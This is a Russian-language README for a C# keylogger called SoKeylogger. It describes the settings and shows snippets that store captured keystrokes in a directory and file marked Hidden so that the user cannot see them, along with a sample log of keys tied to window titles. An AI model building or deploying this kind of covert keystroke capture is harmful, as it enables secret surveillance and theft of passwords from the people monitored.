# SoKeylogger

#### [README_EN](https://github.com/S0mbruh/SoKeylogger/blob/master/README.md)

### О программе

Разработано с использованием .NET framework 4.0 для большей совместимости.

Приложение позволяет записывать нажатия клавиш на ПК в файл.

#### Приложение было создано в рамках изучения C#. Я не несу ответственности за Ваши действия с приложением и исходным кодом.

### Настройки

Вы можете настроить некоторые параметры, меняя переменные в регионе #Settings.

```csharp
// personal ID of this application. helps to sort log files
private static readonly string KLGR_PERS_ID = "1";
// directory path
private static readonly string DIR_PATH = @"C:\directory name";
// log file name
private static readonly string LOG_FILENAME = @"\filename" + KLGR_PERS_ID + ".txt";
// full path to log file
private static readonly string LOGFILE_FP = DIR_PATH + LOG_FILENAME;
```

### Запись логов

Если директория для логов не существует, она создается и ей устанавливается атрибут "Hidden".<br/>
Пользователь не сможет увидеть директорию без включения функции просмотра скрытых элементов в проводнике.

```csharp
if (!Directory.Exists(DIR_PATH)) {
    DirectoryInfo di = Directory.CreateDirectory(DIR_PATH);
    di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
}
```

То же и с log файлом. Он создается, если не существует и ему устанавливается атрибут "Hidden".

```csharp
if (!File.Exists(LOGFILE_FP)) {    
    File.Create(LOGFILE_FP);
    FileInfo fi = new FileInfo(LOGFILE_FP);
    fi.Attributes = FileAttributes.Hidden;
}
```

При перезапуске приложения log файл не будет удален. Программа будет добавлять новые записи в конец файла.<br />
Log файл содержит записи в таком виде: [Дата Время][Заголовок активного окна] -> [Клавиша]

```
[01.01.1970 00:00:00][Notepad] -> T
[01.01.1970 00:00:00][Notepad] -> E
[01.01.1970 00:00:00][Notepad] -> S
[01.01.1970 00:00:00][Notepad] -> T
[01.01.1970 00:00:00][Notepad] -> Space
[01.01.1970 00:00:00][Notepad] -> T
[01.01.1970 00:00:00][Notepad] -> H
[01.01.1970 00:00:00][Notepad] -> I
[01.01.1970 00:00:00][Notepad] -> S
```

### Известные проблемы

- При первом запуске приложения, запись логов не начнется, если дикертория и log файл не существуют.
